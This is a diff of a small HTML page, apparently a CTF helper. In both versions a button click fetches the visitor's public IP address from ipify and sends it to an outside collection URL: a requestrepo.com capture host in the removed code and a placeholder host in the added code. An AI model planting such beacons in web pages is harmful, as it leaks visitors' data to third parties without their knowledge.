@@ -3,30 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Call ctf link</title>
+    <title>Send IP Address</title>
 </head>
 <body>
-    <button id="sendIPButton">Call CTF link</button>
+    <button id="sendIPButton">Send IP Address</button>
     
     <script>
         document.getElementById('sendIPButton').addEventListener('click', () => {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://api.ipify.org?format=json');
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status === 200) {
-                        const response = JSON.parse(xhr.responseText);
-                        const ctf = response.ip;
-                        const url = `http://9zwev8yu.requestrepo.com?c=${ctf}`;
-                        const request = new XMLHttpRequest();
-                        request.open('GET', url);
-                        request.send();
-                    } else {
-                        console.error('Error:', xhr.status);
+            fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
                     }
-                }
-            };
-            xhr.send();
+                    return response.json();
+                })
+                .then(data => {
+                    const ip = data.ip;
+                    const url = `http://rrrr?c=${ip}`;
+                    fetch(url)
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            console.log('IP Address sent successfully');
+                        })
+                        .catch(error => {
+                            console.error('Error sending IP Address:', error.message);
+                        });
+                })
+                .catch(error => {
+                    console.error('Error getting IP Address:', error.message);
+                });
         });
     </script>
 </body>
